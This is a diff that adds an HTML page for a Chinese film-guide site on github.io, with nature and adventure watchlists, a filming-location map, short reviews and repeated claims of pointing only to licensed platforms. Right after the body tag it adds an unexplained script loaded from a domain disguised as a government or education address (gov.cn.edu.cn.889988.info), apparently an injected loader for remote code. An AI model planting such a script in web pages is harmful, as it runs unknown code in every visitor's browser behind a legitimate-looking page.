@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>羚羊电影网：自然野性片单、草原风光与速度观影指南｜lingyangdianyingwang-top.github.io</title>
+<meta name="description" content="羚羊电影网以草原晨曦为灵感，整理自然探索、野性记录、风光迁徙与快节奏冒险四类影单。提供按取景地分类的观影地图、奔跑短评与正版平台指引。页面移动端自适应，符合必应收录规范；完整目录见 https://lingyangdianyingwang-top.github.io，仅作分类与正规渠道指引，不提供未授权视频、网盘或盗链。">
+<meta name="keywords" content="羚羊电影网, 自然野性电影, 草原风光片单, 速度冒险影片, 迁徙地图观影, 正版观看指引, lingyangdianyingwang-top.github.io">
+<meta name="robots" content="index, follow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --sky:#C8E6F5;--sky2:#E8F4F8;--grass:#7CB342;--grass2:#558B2F;--sand:#F5E6C8;--brown:#5D4037;--brown2:#3E2723;
+  --ink:#263238;--soft:#607D8B;--speed:#FF8F00;--speed2:#E65100;--line:#BCAAA4;--shadow:0 6px 18px rgba(62,39,35,.12);
+}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+  color:var(--ink);line-height:1.82;background:var(--sky2);
+  background-image:linear-gradient(180deg,var(--sky2) 0%,var(--sky) 60%,var(--grass) 60%,var(--grass2) 100%);
+  background-size:100% 100%;background-attachment:fixed;
+  -webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:var(--speed2);transition:.2s}
+a:hover{color:var(--brown)}
+ul{list-style:none}
+.container{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* 地平线顶栏 */
+.horizon-bar{background:var(--brown);color:var(--sand);font-size:.76rem;position:relative;z-index:10}
+.horizon-bar .container{display:flex;justify-content:space-between;align-items:center;min-height:34px;flex-wrap:wrap;gap:6px}
+.horizon-bar .coord{font-family:"Courier New",monospace;color:var(--sand);opacity:.9}
+.horizon-bar a{color:var(--sand)}
+.horizon-bar a:hover{color:#fff}
+
+/* 头图：羚羊剪影+风速 */
+.hero{position:relative;padding:60px 0 50px;overflow:hidden}
+.hero .sun{position:absolute;right:8%;top:30px;width:110px;height:110px;border-radius:50%;background:radial-gradient(circle at 35% 30%,#FFF9C4,#FFE082 50%,#FFB300 100%);box-shadow:0 0 40px rgba(255,179,0,.4);opacity:.9}
+.hero .animal{position:absolute;left:4%;bottom:20px;width:80px;height:60px;background:var(--brown);clip-path:polygon(10% 60%,20% 30%,35% 20%,50% 40%,70% 20%,85% 35%,95% 50%,80% 70%,60% 80%,30% 80%,15% 70%);opacity:.15}
+.hero .container{position:relative;z-index:2}
+.hero h1{font-size:clamp(2rem,5vw,3.4rem);line-height:1.18;letter-spacing:1px;margin-bottom:12px;color:var(--brown2)}
+.hero h1 b{color:var(--speed2)}
+.hero .lead{color:var(--brown);font-size:1.02rem;max-width:640px;margin-bottom:20px}
+
+/* 风速仪域名框 */
+.wind-box{display:inline-block;transform:skewX(-12deg);background:var(--speed);padding:14px 22px;border-radius:6px;box-shadow:var(--shadow);position:relative}
+.wind-box .label{font-family:"Courier New",monospace;font-size:.7rem;color:var(--sand);transform:skewX(12deg);display:block;margin-bottom:4px}
+.wind-box .url{font-family:"Courier New",monospace;font-size:.92rem;color:#fff;transform:skewX(12deg);display:block}
+.wind-box .url a{color:#fff}
+.wind-box .url a:hover{color:var(--sand);background:transparent}
+.wind-box::after{content:"🌬";position:absolute;right:-20px;top:-10px;font-size:1.4rem;transform:rotate(15deg)}
+
+/* 路牌导航 */
+nav{margin:24px 0 50px}
+nav ul{display:flex;flex-wrap:wrap;gap:12px;justify-content:center}
+nav a{min-height:48px;display:inline-flex;align-items:center;padding:0 20px;background:var(--sand);border:2px solid var(--brown);border-radius:4px;font-size:.96rem;color:var(--brown2);transform:skewX(-8deg);box-shadow:3px 3px 0 var(--brown)}
+nav a span{transform:skewX(8deg);display:inline-block}
+nav a:hover{background:var(--brown);color:var(--sand);border-color:var(--brown2)}
+
+main{padding-bottom:60px}
+section{margin-bottom:74px}
+.colhead{display:flex;align-items:baseline;gap:14px;margin-bottom:24px;position:relative}
+.colhead::after{content:"";flex:1;height:3px;background:repeating-linear-gradient(90deg,var(--brown) 0 8px,transparent 8px 16px)}
+.colhead .no{font-family:"Courier New",monospace;color:var(--speed2);font-size:.9rem;background:var(--sand);padding:4px 10px;border-radius:4px}
+.colhead h2{font-size:1.58rem;letter-spacing:1px;color:var(--brown2)}
+.colhead .en{font-family:"Courier New",monospace;font-size:.74rem;color:var(--soft);background:var(--sand);padding:4px 10px;border-radius:4px}
+
+/* 栏目一：羚羊精选（倾斜卡片） */
+.featured{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:24px}
+.card{background:var(--sand);border:2px solid var(--brown);border-radius:8px;padding:22px;box-shadow:var(--shadow);position:relative;overflow:hidden;transform:rotate(-1deg)}
+.card:nth-child(even){transform:rotate(1deg);background:#FFF8E1}
+.card:nth-child(3n){transform:rotate(-.5deg)}
+.card .stamp{position:absolute;right:12px;top:12px;background:var(--speed);color:#fff;font-family:"Courier New",monospace;font-size:.68rem;padding:3px 8px;border-radius:3px;transform:rotate(8deg)}
+.card h3{font-size:1.14rem;margin-bottom:8px;color:var(--brown2)}
+.card h3 a{color:var(--brown2)}
+.card h3 a:hover{color:var(--speed2)}
+.card p{font-size:.88rem;color:var(--soft);margin-bottom:10px}
+.card .tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.card .tags span{font-size:.74rem;background:var(--sky);border:1px solid var(--line);padding:3px 8px;border-radius:3px;color:var(--brown)}
+
+/* 栏目二：草原频道（大图+文字） */
+.channels{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
+.channel{background:var(--sand);border-radius:8px;overflow:hidden;border:2px solid var(--brown);box-shadow:var(--shadow)}
+.channel .banner{height:120px;background:linear-gradient(135deg,var(--grass),var(--grass2));display:flex;align-items:center;justify-content:center;color:var(--sand);font-family:"Courier New",monospace;font-size:1.1rem;letter-spacing:2px}
+.channel .banner.b2{background:linear-gradient(135deg,var(--speed),var(--speed2))}
+.channel .banner.b3{background:linear-gradient(135deg,var(--sky),var(--brown))}
+.channel .content{padding:18px}
+.channel h3{font-size:1.1rem;margin-bottom:6px}
+.channel h3 a{color:var(--brown2)}
+.channel p{font-size:.86rem;color:var(--soft);margin-bottom:8px}
+.channel ul li{padding:4px 0;font-size:.84rem;color:var(--soft);border-bottom:1px dashed var(--line)}
+.channel ul li:last-child{border-bottom:0}
+
+/* 栏目三：迁徙地图 */
+.map{background:var(--sand);border:2px solid var(--brown);border-radius:8px;padding:28px;box-shadow:var(--shadow);position:relative}
+.map .gps{position:absolute;right:20px;top:20px;background:var(--brown);color:var(--sand);font-family:"Courier New",monospace;font-size:.72rem;padding:8px 12px;border-radius:4px;transform:rotate(3deg)}
+.map-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px;margin-top:10px}
+.region{border-left:4px solid var(--grass);padding:12px 14px;background:var(--sky2);border-radius:0 6px 6px 0}
+.region h3{font-size:1.02rem;margin-bottom:6px;color:var(--brown2)}
+.region h3 a{color:var(--brown2)}
+.region p{font-size:.84rem;color:var(--soft);margin-bottom:6px}
+.region .coord-tag{font-family:"Courier New",monospace;font-size:.72rem;color:var(--speed2);background:rgba(255,143,0,.1);padding:2px 6px;border-radius:3px}
+
+/* 栏目四：奔跑影评 */
+.reviews{display:flex;flex-direction:column;gap:16px}
+.review{display:flex;gap:16px;align-items:flex-start;background:var(--sand);border:2px solid var(--brown);border-radius:8px;padding:18px;box-shadow:var(--shadow);position:relative}
+.review::before{content:"";position:absolute;left:-10px;top:24px;width:0;height:0;border-top:10px solid transparent;border-bottom:10px solid transparent;border-right:10px solid var(--brown)}
+.review .num{font-family:"Courier New",monospace;font-size:1.4rem;color:var(--speed);font-weight:bold;flex:0 0 50px;text-align:center;background:var(--sky2);border-radius:50%;width:50px;height:50px;display:flex;align-items:center;justify-content:center;border:2px solid var(--brown)}
+.review .text h3{font-size:1.06rem;margin-bottom:4px}
+.review .text h3 a{color:var(--brown2)}
+.review .text p{font-size:.86rem;color:var(--soft)}
+.review .text .meta{font-size:.74rem;color:var(--soft);margin-top:6px;font-family:"Courier New",monospace}
+
+/* 栏目五：正版与版权 */
+.legal{background:var(--sand);border:2px solid var(--brown);border-radius:8px;padding:36px 30px;box-shadow:var(--shadow);max-width:960px;margin:0 auto;position:relative}
+.compass{position:absolute;right:30px;top:30px;width:70px;height:70px;border:3px solid var(--brown);border-radius:50%;display:flex;align-items:center;justify-content:center;transform:rotate(15deg)}
+.compass::before{content:"";position:absolute;width:3px;height:30px;background:var(--speed2);top:5px;left:50%;transform:translateX(-50%)}
+.compass::after{content:"";position:absolute;width:30px;height:3px;background:var(--grass);left:5px;top:50%;transform:translateY(-50%)}
+.legal h2{font-size:1.64rem;margin-bottom:14px;color:var(--brown2)}
+.legal p{font-size:.96rem;color:var(--soft);margin-bottom:12px}
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin:18px 0}
+.step{border:2px dashed var(--line);border-radius:6px;padding:14px;background:var(--sky2)}
+.step b{display:block;color:var(--speed2);font-family:"Courier New",monospace;font-size:.78rem;margin-bottom:6px}
+.url-box{display:inline-block;margin-top:8px;font-family:"Courier New",monospace;background:var(--brown);color:var(--sand);padding:12px 16px;border-radius:4px;transform:skewX(-8deg)}
+.url-box a{color:var(--sand)}
+.url-box a:hover{color:#fff;background:transparent}
+.url-box span{transform:skewX(8deg);display:inline-block}
+.note{margin-top:16px;font-size:.82rem;color:var(--soft);border-top:2px dashed var(--line);padding-top:14px}
+
+footer{background:var(--brown2);color:var(--sand);padding:32px 0;margin-top:54px;border-top:4px solid var(--grass)}
+footer .container{text-align:center}
+footer p{font-size:.86rem;margin-bottom:6px;opacity:.9}
+footer .u{font-family:"Courier New",monospace;color:var(--sky);font-size:.96rem;letter-spacing:.5px}
+
+@media(max-width:768px){
+  .horizon-bar .container{height:auto;padding:6px 20px}
+  .hero{padding:44px 0 30px}
+  .hero .sun{width:70px;height:70px;right:4%;top:20px}
+  .wind-box{transform:skewX(0);padding:12px 16px}
+  .wind-box .label,.wind-box .url{transform:skewX(0)}
+  nav ul{gap:8px}
+  nav a{padding:0 14px;font-size:.9rem;transform:skewX(0);min-height:44px}
+  nav a span{transform:skewX(0)}
+  .colhead h2{font-size:1.3rem}
+  .card{transform:rotate(0)}
+  .card:nth-child(even),.card:nth-child(3n){transform:rotate(0)}
+  .map .gps{position:static;transform:none;margin-bottom:12px;display:inline-block}
+  .compass{display:none}
+  .legal{padding:26px 20px}
+  .url-box{transform:skewX(0);font-size:.84rem;word-break:break-all}
+  .url-box span{transform:skewX(0)}
+  .review{flex-direction:column;gap:10px}
+  .review::before{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="horizon-bar">
+  <div class="container">
+    <span>📍 草原晨曦 · 羚羊电影导航 · 自然野性片单与正版指引</span>
+    <span class="coord">N 35°42' · E 139°42' · lingyangdianyingwang-top.github.io</span>
+  </div>
+</div>
+
+<div class="hero">
+  <div class="sun"></div>
+  <div class="animal"></div>
+  <div class="container">
+    <h1>羚羊<b>电影网</b>·风速观影指南</h1>
+    <p class="lead">像羚羊奔跑一样敏捷选片：自然探索、野性记录、风光迁徙、快节奏冒险四类片单。按取景地建立观影地图，附短评与正版平台建议，不提供未授权完整视频。</p>
+    <div class="wind-box">
+      <span class="label">🌬 风速仪 · 站点坐标</span>
+      <span class="url"><a href="https://lingyangdianyingwang-top.github.io">https://lingyangdianyingwang-top.github.io</a></span>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="#featured"><span>羚羊精选</span></a></li>
+        <li><a href="#channels"><span>草原频道</span></a></li>
+        <li><a href="#map"><span>迁徙地图</span></a></li>
+        <li><a href="#reviews"><span>奔跑影评</span></a></li>
+        <li><a href="#legal"><span>正版与版权</span></a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<main class="container">
+
+  <section id="featured">
+    <div class="colhead">
+      <span class="no">01</span>
+      <h2>羚羊精选</h2>
+      <span class="en">featured picks</span>
+    </div>
+    <div class="featured">
+      <div class="card">
+        <span class="stamp">SPEED</span>
+        <h3><a href="#">速度冒险·追逃与竞速</a></h3>
+        <p>赛车、追逃、极限运动类影片；标注关键动作节点与节奏曲线，适合释放压力。</p>
+        <div class="tags"><span>追车</span><span>潜入</span><span>计时</span></div>
+      </div>
+      <div class="card">
+        <span class="stamp">NATURE</span>
+        <h3><a href="#">自然野性·生存与迁徙</a></h3>
+        <p>非洲草原、极地、雨林题材；整理动物行为、季节变化与生态伦理，不渲染血腥。</p>
+        <div class="tags"><span>草原</span><span>极地</span><span>雨林</span></div>
+      </div>
+      <div class="card">
+        <span class="stamp">LANDSCAPE</span>
+        <h3><a href="#">风光大片·取景地巡礼</a></h3>
+        <p>按电影取景地分类：东非大裂谷、落基山脉、内蒙古草原；结合旅行与观影。</p>
+        <div class="tags"><span>东非</span><span>落基</span><span>蒙古</span></div>
+      </div>
+      <div class="card">
+        <span class="stamp">DOC</span>
+        <h3><a href="#">纪录片·真实奔跑</a></h3>
+        <p>自然纪录片、探险纪实；整理拍摄地、拍摄季节与正版平台版本信息。</p>
+        <div class="tags"><span>纪实</span><span>4K</span><span>IMAX</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="channels">
+    <div class="colhead">
+      <span class="no">02</span>
+      <h2>草原频道</h2>
+      <span class="en">grassland channels</span>
+    </div>
+    <div class="channels">
+      <div class="channel">
+        <div class="banner">🏔 高山与草原</div>
+        <div class="content">
+          <h3><a href="#">高山草原·辽阔叙事</a></h3>
+          <p>以广阔地貌为背景的成长、归乡、探险故事；整理长镜头与空镜运用。</p>
+          <ul>
+            <li>归乡长路</li>
+            <li>高山向导</li>
+            <li>草原婚礼</li>
+          </ul>
+        </div>
+      </div>
+      <div class="channel">
+        <div class="banner b2">🏃 奔跑与自由</div>
+        <div class="content">
+          <h3><a href="#">奔跑者·自由主题</a></h3>
+          <p>马拉松、越野、迁徙主题；分析主角动机、阻碍与突破，不写低俗情感。</p>
+          <ul>
+            <li>马拉松心路</li>
+            <li>越野穿越</li>
+            <li>自由边界</li>
+          </ul>
+        </div>
+      </div>
+      <div class="channel">
+        <div class="banner b3">🎥 拍摄地志</div>
+        <div class="content">
+          <h3><a href="#">取景地志·电影旅行</a></h3>
+          <p>按真实拍摄地整理片单，标注最佳观影季节与旅行参考，正版平台可播版本。</p>
+          <ul>
+            <li>肯尼亚马赛</li>
+            <li>纳米比亚红沙</li>
+            <li>内蒙古呼伦贝尔</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="map">
+    <div class="colhead">
+      <span class="no">03</span>
+      <h2>迁徙地图</h2>
+      <span class="en">migration map</span>
+    </div>
+    <div class="map">
+      <div class="gps">📡 GPS: lingyangdianyingwang-top.github.io</div>
+      <p style="color:var(--soft);margin-bottom:14px">按电影取景地与故事发生地分类，点击区域查看对应片单与正版指引。</p>
+      <div class="map-grid">
+        <div class="region">
+          <h3><a href="#">东非大裂谷</a></h3>
+          <p>角马过河、草原狮群、马赛部落题材；整理自然纪录片与冒险片。</p>
+          <span class="coord-tag">坐标: 0°20'S 35°30'E</span>
+        </div>
+        <div class="region">
+          <h3><a href="#">南非草原</a></h3>
+          <p>克鲁格公园、好望角；整理野生动物保护与生存挑战类影片。</p>
+          <span class="coord-tag">坐标: 24°0'S 31°0'E</span>
+        </div>
+        <div class="region">
+          <h3><a href="#">北美落基山</a></h3>
+          <p>高山草甸、灰狼回归、驯鹿迁徙；整理生态伦理与西部题材。</p>
+          <span class="coord-tag">坐标: 43°N 110°W</span>
+        </div>
+        <div class="region">
+          <h3><a href="#">蒙古高原</a></h3>
+          <p>呼伦贝尔、蒙古野马、游牧文化；整理草原生活与人文纪录片。</p>
+          <span class="coord-tag">坐标: 46°N 105°E</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="reviews">
+    <div class="colhead">
+      <span class="no">04</span>
+      <h2>奔跑影评</h2>
+      <span class="en">running reviews</span>
+    </div>
+    <div class="reviews">
+      <div class="review">
+        <div class="num">01</div>
+        <div class="text">
+          <h3><a href="#">《草原上的树》—— 慢叙事中的生命力</a></h3>
+          <p>以一棵树为视角，记录草原四季变化与牧民迁徙。长镜头运用克制，适合右屏慢叙模式观看。</p>
+          <div class="meta">评分: 8.4 · 节奏: 慢 · 推荐: 周末家庭</div>
+        </div>
+      </div>
+      <div class="review">
+        <div class="num">02</div>
+        <div class="text">
+          <h3><a href="#">《追风者》—— 速度与信念的双线</a></h3>
+          <p>赛车手转型公益跑者的真实故事，前半段快剪追车，后半段长跑长镜，左右分屏对照的绝佳案例。</p>
+          <div class="meta">评分: 7.9 · 节奏: 快→慢 · 推荐: 运动爱好者</div>
+        </div>
+      </div>
+      <div class="review">
+        <div class="num">03</div>
+        <div class="text">
+          <h3><a href="#">《角马过河》—— 自然纪录的巅峰</a></h3>
+          <p>摄制组蹲守三年拍摄角马过河，无解说纯自然声，IMAX版震撼。标注拍摄季与正版4K源。</p>
+          <div class="meta">评分: 9.1 · 节奏: 自然 · 推荐: 纪录片迷</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="legal">
+    <div class="colhead">
+      <span class="no">05</span>
+      <h2>正版与版权</h2>
+      <span class="en">legal & compass</span>
+    </div>
+    <div class="legal">
+      <div class="compass"></div>
+      <h2>羚羊电影如何正规看</h2>
+      <p>羚羊电影网仅做自然、风光、冒险分类与取景地地图，不提供完整未授权视频、网盘、聚合盗链或破解播放器。具体可播片目以制片方、发行方或正规平台当前授权为准；地区、字幕、版本可能不同。</p>
+      <div class="steps">
+        <div class="step"><b>STEP 1 定类型</b>按速度/自然/风光/纪录四类选片，避免把纪录片当剧情片期待。</div>
+        <div class="step"><b>STEP 2 查取景地</b>用拍摄地+片名搜索，区分真实纪录片与剧情改编。</div>
+        <div class="step"><b>STEP 3 找正版</b>只去有公映或网络播映授权公示的正规影视库，核对IMAX/4K版本。</div>
+        <div class="step"><b>STEP 4 报问题</b>发现死链、未授权资源或坐标错误，换正版平台并提交站点更正。</div>
+      </div>
+      <div class="url-box"><span><a href="https://lingyangdianyingwang-top.github.io">https://lingyangdianyingwang-top.github.io</a></span></div>
+      <div class="note">
+        合规声明：本页不设置未授权下载、网盘合集、破解客户端或成人低俗分类。羚羊仅为选片速度标签，不替代影片分级；若您为著作权人并认为某条信息不当，可提交权属证明、涉及页面与整改要求，核实后调整或删除。具体公映资质、地区可播范围以正规发行方说明为准。
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <p>羚羊电影网 · 自然野性片单、草原风光、迁徙地图与正版观看指引</p>
+    <p>关键词：羚羊电影网｜自然野性电影｜草原风光片单｜速度冒险影片｜迁徙地图观影｜lingyangdianyingwang-top.github.io</p>
+    <p class="u">lingyangdianyingwang-top.github.io</p>
+  </div>
+</footer>
+</body>
+</html>
